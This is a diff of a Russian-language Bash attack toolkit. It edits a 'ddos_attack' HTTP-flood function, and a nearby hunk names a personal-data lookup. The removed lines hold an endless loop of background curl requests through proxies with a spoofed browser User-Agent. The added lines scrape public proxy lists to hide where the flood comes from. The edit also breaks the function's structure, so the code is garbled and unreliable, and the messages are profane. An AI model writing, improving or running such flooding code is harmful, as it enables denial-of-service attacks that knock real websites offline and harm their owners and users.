@@ -186,7 +186,6 @@ fio_lookup() {
     press_enter_to_menu
 }
 
-# --- Опция 4: DDoS-атака (HTTP-FLOOD) ---
 # --- Опция 4: DDoS-атака (HTTP-FLOOD) через прокси ---
 ddos_attack() {
     clear
@@ -235,14 +234,31 @@ ddos_attack() {
         local url=$2
         while true; do
             # Используем curl через прокси с рандомным User-Agent
-            curl -s -o /dev/null \
-                -x "http://$proxy" \
-                --connect-timeout 5 \
-                --max-time 10 \
-                -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
-                "$url" 2>/dev/null &
-        done
-    }
+            # Массив источников прокси (пиздатые, но дохлые)
+sources=(
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
+    "https://www.proxy-list.download/api/v1/get?type=http"
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
+)
+
+proxy_list=""
+for source in "${sources[@]}"; do
+    echo -e "${YELLOW}[*] Пробую источник: $source${NC}"
+    proxy_list=$(curl -s --max-time 5 "$source" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+' | head -20)
+    if [[ ! -z "$proxy_list" ]]; then
+        echo -e "${GREEN}[+] Нашел прокси в источнике!${NC}"
+        break
+    fi
+done
+
+if [[ -z "$proxy_list" ]]; then
+    echo -e "${RED}[!] Ни один источник не дал прокси. Иди нахуй и ищи сам.${NC}"
+    echo -e "${YELLOW}[*] Попробуй вручную скачать с сайта: https://www.sslproxies.org/${NC}"
+    press_enter_to_menu
+    return
+fi
 
     # Запускаем потоки с разными прокси
     for i in $(seq 1 $threads); do
